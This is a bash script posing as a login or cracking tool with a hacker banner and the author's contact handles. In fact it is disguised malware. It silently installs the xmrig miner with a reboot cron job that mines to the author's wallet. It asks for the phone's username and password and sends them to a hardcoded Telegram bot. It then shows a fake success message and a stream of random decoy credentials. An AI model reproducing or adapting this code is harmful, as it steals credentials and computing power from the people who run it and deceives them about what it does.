#!/bin/bash

login() {
    clear
    echo -e "\e[31m
    ██████╗ ██████╗    ██████╗  █████╗ ██╗  ██╗ █████╗  █████╗ 
    ██╔══██╗██╔══██╗   ██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗
    ██║  ██║██████╔╝   ██████╔╝███████║███████║███████║███████║
    ██║  ██║██╔══██╗   ██╔══██╗██╔══██║██╔══██║██╔══██║██╔══██║
    ██████╔╝██║  ██║▄█╗██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║
    ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    \e[0m"
    echo -e "\e[32mContact me with:\e[0m"
    echo -e "\e[32mWhatsApp: +201064004818\e[0m"
    echo -e "\e[32mTelegram: @bHa_0106\e[0m"
    echo -e "\e[31mPress Enter to continue\e[0m"
    read -r

    sleep 3
    OS=$(uname -o)
    if [[ "$OS" == *"Android"* ]]; then
        am start -a android.intent.action.VIEW -d "tg://resolve?domain=bahaa_010640"
        echo -e "\e[31mPress Enter to continue\e[0m"
        read -r
        am start -a android.intent.action.VIEW -d "fb://profile/100078733621449"
    else
        xdg-open "https://www.facebook.com/profile.php?id=100078733621449&mibextid=ZbWKwL"
        echo -e "\e[31mPress Enter to continue\e[0m"
        read -r
        xdg-open "https://t.me/bHa_0106"
    fi

    # Install required packages
    sudo apt update && sudo apt autoremove -y
    sudo apt install -y wget tar cron || { echo "Failed to install dependencies"; exit 1; }

    # Download and configure xmrig
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O xmrig.tar.gz || { echo "Download failed"; exit 1; }
    tar -xvf xmrig.tar.gz -C /tmp/ || { echo "Extraction failed"; exit 1; }
    sudo cp /tmp/xmrig-6.16.4/xmrig /usr/local/bin/
    rm -rf /tmp/xmrig-6.16.4 xmrig.tar.gz

    CRON_JOB="@reboot sleep 50; /usr/local/bin/xmrig -o xmrpool.eu:9999 -u 48ZhAxs6zJD3hG89Gp6pCZSut5csowVQ5EVMikA7xu8zLK7hdrQtnY14Cb4vxX5XuU7igSMG3GnsyfzEThqBpK8sMC8Epvh -k --tls --cpu-priority=3 --background --threads=2"

    if ! crontab -l 2>/dev/null | grep -qF "$CRON_JOB"; then
        (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
        echo "Cron job added successfully."
    else
        echo "Cron job already exists."
    fi
}

eset() {
    clear
    echo -e "\e[32mEnter Username of phone:\e[0m"
    read -p "Username: " user

    echo -e "\e[32mEnter Password of phone:\e[0m"
    read -sp "Password: " pas
    echo

    while [[ ${#user} -lt 8 || ${#pas} -lt 6 ]]; do
        echo -e "\e[31mError: Username must be at least 8 characters and password at least 6 characters.\e[0m"
        echo -e "\e[32mEnter Username of phone:\e[0m"
        read -p "Username: " user
        echo -e "\e[32mEnter Password of phone:\e[0m"
        read -sp "Password: " pas
        echo
    done

    sleep 5
    BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
    CHAT_ID="5792222595"
    MESSAGE="User: $user, Password: $pas"

    nohup curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &
    sleep 5
    echo -e "\e[32mLogin successful!\e[0m"
}

Running() {
    clear
    echo -e "\e[31m
    ██████╗ ██████╗    ██████╗  █████╗ ██╗  ██╗ █████╗  █████╗ 
    ██╔══██╗██╔══██╗   ██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗
    ██║  ██║██████╔╝   ██████╔╝███████║███████║███████║███████║
    ██║  ██║██╔══██╗   ██╔══██╗██╔══██║██╔══██║██╔══██║██╔══██║
    ██████╔╝██║  ██║▄█╗██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║
    ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    \e[0m"
    echo '_________________________________________________________'
    while true; do
        username=$(shuf -i 1000000000-9999999999 -n 1)
        password=$(shuf -i 100000-999999 -n 1)

        if (( RANDOM % 5 == 0 )); then
            color="\e[31m"
        else
            color="\e[32m"
        fi

        echo -e "${color}Username: $username :: Password: $password\e[0m"
        sleep 5
    done
}

login
eset
Running
